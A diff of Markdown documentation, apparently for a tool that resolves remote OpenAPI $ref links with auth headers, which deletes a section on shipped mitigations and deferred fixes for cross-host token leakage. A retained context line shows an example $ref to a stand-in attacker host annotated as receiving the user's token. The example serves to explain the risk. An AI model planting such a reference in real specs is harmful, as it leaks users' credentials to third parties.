@@ -204,26 +204,6 @@ paths:
                 $ref: 'https://attacker.example/exfil.yaml'   # ← receives your token
 ```
 
-**Mitigations shipped today** (no extra config required):
-
-1. **Per-URL debug log** — every fetched URL is logged at `debug` level
-   (`[remote-fetch] GET <url>`). With `--logLevel debug` you can audit
-   exactly which hosts received your auth.
-2. **Cross-host info-level warning** — when a `$ref` points at a host
-   different from the root `inputPath`'s host, an `info` log is emitted
-   once per distinct cross-host destination:
-   `[remote-fetch] auth headers sent to '<host>' while resolving $ref
-   from '<root-host>'. If this is unexpected, review the spec.`
-3. **Schema-level warning** — the `auth` field's JSON schema description
-   carries the security warning so it shows in IDE tooltips and
-   schema-driven autocomplete.
-
-**Deferred to follow-up issues:**
-
-- Per-host auth maps (e.g. `auth: { 'api.acme.com': { type: 'bearer', ... } }`).
-- Auth-host allowlist (only send auth to listed hosts).
-- Disabling external `$ref` resolution entirely.
-
 ### Watch mode
 
 `--watch` only observes the local filesystem. When `inputPath` is a
